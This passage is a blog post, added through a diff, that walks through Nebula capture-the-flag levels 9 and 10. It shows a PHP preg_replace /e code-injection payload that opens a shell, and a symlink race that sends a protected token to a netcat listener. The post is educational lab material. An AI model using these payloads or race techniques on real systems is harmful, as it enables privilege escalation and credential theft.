+  <span style="color: #f8f8f2">$contents</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">file_get_contents($filename);</span>
+
+  <span style="color: #f8f8f2">$contents</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">preg_replace(</span><span style="color: #e6db74">&quot;/(\[email (.*)\])/e&quot;</span><span style="color: #f8f8f2">,</span> <span style="color: #e6db74">&quot;spam(</span><span style="color: #ae81ff">\&quot;\\</span><span style="color: #e6db74">2</span><span style="color: #ae81ff">\&quot;</span><span style="color: #e6db74">)&quot;</span><span style="color: #f8f8f2">,</span> <span style="color: #f8f8f2">$contents);</span>
+  <span style="color: #f8f8f2">$contents</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">preg_replace(</span><span style="color: #e6db74">&quot;/\[/&quot;</span><span style="color: #f8f8f2">,</span> <span style="color: #e6db74">&quot;&lt;&quot;</span><span style="color: #f8f8f2">,</span> <span style="color: #f8f8f2">$contents);</span>
+  <span style="color: #f8f8f2">$contents</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">preg_replace(</span><span style="color: #e6db74">&quot;/\]/&quot;</span><span style="color: #f8f8f2">,</span> <span style="color: #e6db74">&quot;&gt;&quot;</span><span style="color: #f8f8f2">,</span> <span style="color: #f8f8f2">$contents);</span>
+
+  <span style="color: #66d9ef">return</span> <span style="color: #f8f8f2">$contents;</span>
+<span style="color: #f8f8f2">}</span>
+
+<span style="color: #f8f8f2">$output</span> <span style="color: #f92672">=</span> <span style="color: #a6e22e">markup</span><span style="color: #f8f8f2">($argv[</span><span style="color: #ae81ff">1</span><span style="color: #f8f8f2">],</span> <span style="color: #f8f8f2">$argv[</span><span style="color: #ae81ff">2</span><span style="color: #f8f8f2">]);</span>
+
+<span style="color: #66d9ef">print</span> <span style="color: #f8f8f2">$output;</span>
+
+<span style="color: #75715e">?&gt;</span>
+</pre></div>
+</p>
+
+<p>Let&rsquo;s run it to see what it actually does.</p>
+
+<p><div class="highlight" style="background: #272822"><pre style="line-height: 125%">level09@nebula:/home/flag09$ <span style="color: #f8f8f2">echo</span> <span style="color: #f92672">[</span>email mail@test.com<span style="color: #f92672">]</span> &gt; /tmp/test.txt
+level09@nebula:/home/flag09$ ./flag09 /tmp/test.txt fasdf
+mail AT test dot com
+</pre></div>
+</p>
+
+<p>So the vulnerable part here is the <code>preg_replace</code> with the <em>e</em> flag. For information on this see <a href="https://bugs.php.net/bug.php?id=35960">https://bugs.php.net/bug.php?id=35960</a>.</p>
+
+<p>So there&rsquo;s a few ways we can exploit this. We basically need to pass a command to the script that will get executed in the <code>preg_replace</code>. Let&rsquo;s try to simply get a shell as the <em>flag09</em> user and get our flag.</p>
+
+<p><div class="highlight" style="background: #272822"><pre style="line-height: 125%">level09@nebula:/home/flag09$ <span style="color: #f8f8f2">echo</span> <span style="color: #e6db74">&#39;[email ${${@system(&#39;</span>sh<span style="color: #e6db74">&#39;)}}]&#39;</span> &gt; /tmp/test.txt
+level09@nebula:/home/flag09$ ./flag09 /tmp/test.txt fasdf
+sh-4.2$ whoami
+flag09
+sh-4.2$ getflag
+You have successfully executed getflag on a target account
+</pre></div>
+</p>
+
+<h2 id="level-10:30500b9ac805cc116818bc6edd5ba7d1">Level 10</h2>
+
+<blockquote>
+<p>The setuid binary at /home/flag10/flag10 binary will upload any file given, as long as it meets the requirements of the access() system call.</p>
+</blockquote>
+
+<p><div class="highlight" style="background: #272822"><pre style="line-height: 125%"><span style="color: #75715e">#include &lt;stdlib.h&gt;</span>
+<span style="color: #75715e">#include &lt;unistd.h&gt;</span>
+<span style="color: #75715e">#include &lt;sys/types.h&gt;</span>
+<span style="color: #75715e">#include &lt;stdio.h&gt;</span>
+<span style="color: #75715e">#include &lt;fcntl.h&gt;</span>
+<span style="color: #75715e">#include &lt;errno.h&gt;</span>
+<span style="color: #75715e">#include &lt;sys/socket.h&gt;</span>
+<span style="color: #75715e">#include &lt;netinet/in.h&gt;</span>
+<span style="color: #75715e">#include &lt;string.h&gt;</span>
+
+<span style="color: #66d9ef">int</span> <span style="color: #a6e22e">main</span><span style="color: #f8f8f2">(</span><span style="color: #66d9ef">int</span> <span style="color: #f8f8f2">argc,</span> <span style="color: #66d9ef">char</span> <span style="color: #f92672">**</span><span style="color: #f8f8f2">argv)</span>
+<span style="color: #f8f8f2">{</span>
+  <span style="color: #66d9ef">char</span> <span style="color: #f92672">*</span><span style="color: #f8f8f2">file;</span>
+  <span style="color: #66d9ef">char</span> <span style="color: #f92672">*</span><span style="color: #f8f8f2">host;</span>
+
+  <span style="color: #66d9ef">if</span><span style="color: #f8f8f2">(argc</span> <span style="color: #f92672">&lt;</span> <span style="color: #ae81ff">3</span><span style="color: #f8f8f2">)</span> <span style="color: #f8f8f2">{</span>
+    <span style="color: #f8f8f2">printf(</span><span style="color: #e6db74">&quot;%s file host</span><span style="color: #ae81ff">\n\t</span><span style="color: #e6db74">sends file to host if you have access to it</span><span style="color: #ae81ff">\n</span><span style="color: #e6db74">&quot;</span><span style="color: #f8f8f2">,</span> <span style="color: #f8f8f2">argv[</span><span style="color: #ae81ff">0</span><span style="color: #f8f8f2">]);</span>
+    <span style="color: #f8f8f2">exit(</span><span style="color: #ae81ff">1</span><span style="color: #f8f8f2">);</span>
+  <span style="color: #f8f8f2">}</span>
+
+  <span style="color: #f8f8f2">file</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">argv[</span><span style="color: #ae81ff">1</span><span style="color: #f8f8f2">];</span>
+  <span style="color: #f8f8f2">host</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">argv[</span><span style="color: #ae81ff">2</span><span style="color: #f8f8f2">];</span>
+
+  <span style="color: #66d9ef">if</span><span style="color: #f8f8f2">(access(argv[</span><span style="color: #ae81ff">1</span><span style="color: #f8f8f2">],</span> <span style="color: #f8f8f2">R_OK)</span> <span style="color: #f92672">==</span> <span style="color: #ae81ff">0</span><span style="color: #f8f8f2">)</span> <span style="color: #f8f8f2">{</span>
+    <span style="color: #66d9ef">int</span> <span style="color: #f8f8f2">fd;</span>
+    <span style="color: #66d9ef">int</span> <span style="color: #f8f8f2">ffd;</span>
+    <span style="color: #66d9ef">int</span> <span style="color: #f8f8f2">rc;</span>
+    <span style="color: #66d9ef">struct</span> <span style="color: #f8f8f2">sockaddr_in</span> <span style="color: #f8f8f2">sin;</span>
+    <span style="color: #66d9ef">char</span> <span style="color: #f8f8f2">buffer[</span><span style="color: #ae81ff">4096</span><span style="color: #f8f8f2">];</span>
+
+    <span style="color: #f8f8f2">printf(</span><span style="color: #e6db74">&quot;Connecting to %s:18211 .. &quot;</span><span style="color: #f8f8f2">,</span> <span style="color: #f8f8f2">host);</span> <span style="color: #f8f8f2">fflush(stdout);</span>
+
+    <span style="color: #f8f8f2">fd</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">socket(AF_INET,</span> <span style="color: #f8f8f2">SOCK_STREAM,</span> <span style="color: #ae81ff">0</span><span style="color: #f8f8f2">);</span>
+
+    <span style="color: #f8f8f2">memset(</span><span style="color: #f92672">&amp;</span><span style="color: #f8f8f2">sin,</span> <span style="color: #ae81ff">0</span><span style="color: #f8f8f2">,</span> <span style="color: #66d9ef">sizeof</span><span style="color: #f8f8f2">(</span><span style="color: #66d9ef">struct</span> <span style="color: #f8f8f2">sockaddr_in));</span>
+    <span style="color: #f8f8f2">sin.sin_family</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">AF_INET;</span>
+    <span style="color: #f8f8f2">sin.sin_addr.s_addr</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">inet_addr(host);</span>
+    <span style="color: #f8f8f2">sin.sin_port</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">htons(</span><span style="color: #ae81ff">18211</span><span style="color: #f8f8f2">);</span>
+
+    <span style="color: #66d9ef">if</span><span style="color: #f8f8f2">(connect(fd,</span> <span style="color: #f8f8f2">(</span><span style="color: #66d9ef">void</span> <span style="color: #f92672">*</span><span style="color: #f8f8f2">)</span><span style="color: #f92672">&amp;</span><span style="color: #f8f8f2">sin,</span> <span style="color: #66d9ef">sizeof</span><span style="color: #f8f8f2">(</span><span style="color: #66d9ef">struct</span> <span style="color: #f8f8f2">sockaddr_in))</span> <span style="color: #f92672">==</span> <span style="color: #f92672">-</span><span style="color: #ae81ff">1</span><span style="color: #f8f8f2">)</span> <span style="color: #f8f8f2">{</span>
+      <span style="color: #f8f8f2">printf(</span><span style="color: #e6db74">&quot;Unable to connect to host %s</span><span style="color: #ae81ff">\n</span><span style="color: #e6db74">&quot;</span><span style="color: #f8f8f2">,</span> <span style="color: #f8f8f2">host);</span>
+      <span style="color: #f8f8f2">exit(EXIT_FAILURE);</span>
+    <span style="color: #f8f8f2">}</span>
+
+<span style="color: #75715e">#define HITHERE &quot;.oO Oo.\n&quot;</span>
+    <span style="color: #66d9ef">if</span><span style="color: #f8f8f2">(write(fd,</span> <span style="color: #f8f8f2">HITHERE,</span> <span style="color: #f8f8f2">strlen(HITHERE))</span> <span style="color: #f92672">==</span> <span style="color: #f92672">-</span><span style="color: #ae81ff">1</span><span style="color: #f8f8f2">)</span> <span style="color: #f8f8f2">{</span>
+      <span style="color: #f8f8f2">printf(</span><span style="color: #e6db74">&quot;Unable to write banner to host %s</span><span style="color: #ae81ff">\n</span><span style="color: #e6db74">&quot;</span><span style="color: #f8f8f2">,</span> <span style="color: #f8f8f2">host);</span>
+      <span style="color: #f8f8f2">exit(EXIT_FAILURE);</span>
+    <span style="color: #f8f8f2">}</span>
+<span style="color: #75715e">#undef HITHERE</span>
+
+    <span style="color: #f8f8f2">printf(</span><span style="color: #e6db74">&quot;Connected!</span><span style="color: #ae81ff">\n</span><span style="color: #e6db74">Sending file .. &quot;</span><span style="color: #f8f8f2">);</span> <span style="color: #f8f8f2">fflush(stdout);</span>
+
+    <span style="color: #f8f8f2">ffd</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">open(file,</span> <span style="color: #f8f8f2">O_RDONLY);</span>
+    <span style="color: #66d9ef">if</span><span style="color: #f8f8f2">(ffd</span> <span style="color: #f92672">==</span> <span style="color: #f92672">-</span><span style="color: #ae81ff">1</span><span style="color: #f8f8f2">)</span> <span style="color: #f8f8f2">{</span>
+      <span style="color: #f8f8f2">printf(</span><span style="color: #e6db74">&quot;Damn. Unable to open file</span><span style="color: #ae81ff">\n</span><span style="color: #e6db74">&quot;</span><span style="color: #f8f8f2">);</span>
+      <span style="color: #f8f8f2">exit(EXIT_FAILURE);</span>
+    <span style="color: #f8f8f2">}</span>
+
+    <span style="color: #f8f8f2">rc</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">read(ffd,</span> <span style="color: #f8f8f2">buffer,</span> <span style="color: #66d9ef">sizeof</span><span style="color: #f8f8f2">(buffer));</span>
+    <span style="color: #66d9ef">if</span><span style="color: #f8f8f2">(rc</span> <span style="color: #f92672">==</span> <span style="color: #f92672">-</span><span style="color: #ae81ff">1</span><span style="color: #f8f8f2">)</span> <span style="color: #f8f8f2">{</span>
+      <span style="color: #f8f8f2">printf(</span><span style="color: #e6db74">&quot;Unable to read from file: %s</span><span style="color: #ae81ff">\n</span><span style="color: #e6db74">&quot;</span><span style="color: #f8f8f2">,</span> <span style="color: #f8f8f2">strerror(errno));</span>
+      <span style="color: #f8f8f2">exit(EXIT_FAILURE);</span>
+    <span style="color: #f8f8f2">}</span>
+
+    <span style="color: #f8f8f2">write(fd,</span> <span style="color: #f8f8f2">buffer,</span> <span style="color: #f8f8f2">rc);</span>
+
+    <span style="color: #f8f8f2">printf(</span><span style="color: #e6db74">&quot;wrote file!</span><span style="color: #ae81ff">\n</span><span style="color: #e6db74">&quot;</span><span style="color: #f8f8f2">);</span>
+
+  <span style="color: #f8f8f2">}</span> <span style="color: #66d9ef">else</span> <span style="color: #f8f8f2">{</span>
+    <span style="color: #f8f8f2">printf(</span><span style="color: #e6db74">&quot;You don&#39;t have access to %s</span><span style="color: #ae81ff">\n</span><span style="color: #e6db74">&quot;</span><span style="color: #f8f8f2">,</span> <span style="color: #f8f8f2">file);</span>
+  <span style="color: #f8f8f2">}</span>
+<span style="color: #f8f8f2">}</span>
+</pre></div>
+</p>
+
+<p>Now this one take a bit of playing around to get it right. Basically what we are exploiting here is that the file gets checked and then gets used. The <code>access</code> call checks the permissions based on the actual user, not the guid user. The file open calls however will run as the guid user. So in between these two calls, we <em>could</em> modify the target file and get the program to read the right file.</p>
+
+<p>So ideally we want to create a symlink to a file we own when the <code>access</code> call runs, then replace that symlink with one that points to the token file. This relies heavily on timing when to update the symlink. I had a play and this is the most reliable way I have found.</p>
+
+<p>You will need two shells (both on nebula is fine but optional); call them termA and termB. So in termB startup a listening netcat on the relevant port</p>
+
+<p><div class="highlight" style="background: #272822"><pre style="line-height: 125%">level10@nebula:~$ nc -l 18211
+</pre></div>
+</p>
+
+<p>in termA we create our symlink, then run the command along with a command to update the symlink</p>
+
+<p><div class="highlight" style="background: #272822"><pre style="line-height: 125%">level10@nebula:/home/flag10$ touch /tmp/mytoken
+level10@nebula:/home/flag10$ ln -fs /tmp/mytoken /tmp/getme
+level10@nebula:/home/flag10$ ./flag10 /tmp/getme 192.168.0.8 <span style="color: #f8f8f2">&amp;</span> ln -fs /home/flag10/token /tmp/getme
+[1] 7359
+Connecting to 192.168.0.8:18211 .. level10@nebula:/home/flag10$ Connected!
+Sending file .. wrote file!
+</pre></div>
+</p>
+
+<p>Meanwhile, back in termB</p>
+
+<p><div class="highlight" style="background: #272822"><pre style="line-height: 125%">.oO Oo.
+615a2ce1-b2b5-4c76-8eed-8aa5c4015c27
+level10@nebula:~$ ssh flag10@localhost
+
+flag10@localhost&#39;s password: 615a2ce1-b2b5-4c76-8eed-8aa5c4015c27
+
+flag10@nebula:~$ getflag
+You have successfully executed getflag on a target account
+</pre></div>
+</p>
+
+<p><a href="http://unlogic.co.uk/2014/07/02/cracking-nebula-part2/">Part 2 of Cracking Nebula</a></p>
+
+            <ul class="share-buttons">
+    <li></li>
+    <li>
+        <a class="icon-facebook-squared" href="https://www.facebook.com/sharer/sharer.php?u=http%3a%2f%2funlogic.co.uk%2f2014%2f06%2f24%2fcracking-nebula-part1%2f" onclick="window.open(this.href, 'facebook-share','width=580,height=296');return false;" title=""></a>
+    </li>
+    <li>
+        <a class="icon-twitter" href="https://twitter.com/share?text=Cracking%20Nebula%20Part%201&amp;url=http%3a%2f%2funlogic.co.uk%2f2014%2f06%2f24%2fcracking-nebula-part1%2f" onclick="window.open(this.href, 'twitter-share', 'width=550,height=235');return false;" title=""></a>
+    </li>
+    <li>
+        <a class="icon-gplus" href="https://plus.google.com/share?url=http%3a%2f%2funlogic.co.uk%2f2014%2f06%2f24%2fcracking-nebula-part1%2f" onclick="window.open(this.href, 'google-plus-share', 'width=490,height=530');return false;" title=""></a>
+    </li>
+    <li>
+        <a class="icon-linkedin" href="https://www.linkedin.com/shareArticle?mini=true&url=http%3a%2f%2funlogic.co.uk%2f2014%2f06%2f24%2fcracking-nebula-part1%2f&title=Cracking%20Nebula%20Part%201" onclick="window.open(this.href, 'linkedin-share', 'width=600,height=494');return false;" title=""></a>
+    </li>
+</ul>
+
+        </article>
+        <div class="comments">
+            <h3></h3>
+            <div id="disqus_thread"></div>
+<script type="text/javascript">
+    var disqus_shortname = 'unlogic';
+    var disqus_identifier = 'http:\/\/unlogic.co.uk\/2014\/06\/24\/cracking-nebula-part1\/';
+    var disqus_title = 'Cracking Nebula Part 1';
+    var disqus_url = 'http:\/\/unlogic.co.uk\/2014\/06\/24\/cracking-nebula-part1\/';
+
+    (function() {
+        var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+        dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+        (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+    })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+<a href="http://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+        </div>
+    </main>
+    <aside class="author">
+  <img class="profile-image" src="http://unlogic.co.ukimages/avatar.jpg" alt="Sven Steinbauer" />
+  <p class="name"> 
+  <strong>Sven Steinbauer</strong></p>
+  <p class="address"></p>
+  <p class="link"></p>
+  <ul class="social">
+    
+<li><a href="//twitter.com/binaryheadache" class="icon-twitter" target="_blank" title="Twitter"></a></li>
+
+
+
+
+
+
+
+
+
+
+
+
+
+<li><a href="//github.com/svenito" class="icon-github" target="_blank" title="Github"></a></li>
+
+
+
+
+<li><a href="http://unlogic.co.ukpost/index.xml" class="icon-rss" target="_blank" title="RSS"></a></li>
+
+  </ul>
+  <br><br>
+</aside>
+
+</div>
+
+<footer class="main-footer">
+  <div class="container clearfix">
+        <a class="icon-rss" href="http://unlogic.co.ukpost/index.xml" title="RSS"></a>
+        <p>&copy; 2016 &middot; Sven Steinbauer</p>
+  </div>
+</footer>
+<script src="//ajax.googleapis.com/ajax/libs/jquery/1.11.0/jquery.min.js"></script>
+<script src="//cdnjs.cloudflare.com/ajax/libs/highlight.js/8.8.0/highlight.min.js"></script>
+<script>hljs.initHighlightingOnLoad();</script>
+<script>window.jQuery || document.write('<script src="http:\/\/unlogic.co.ukjs/vendor/jquery-1.11.0.min.js"><\/script>')</script>
+<script src="http://unlogic.co.ukjs/plugins.js"></script>
+
+</body>
+</html>
+
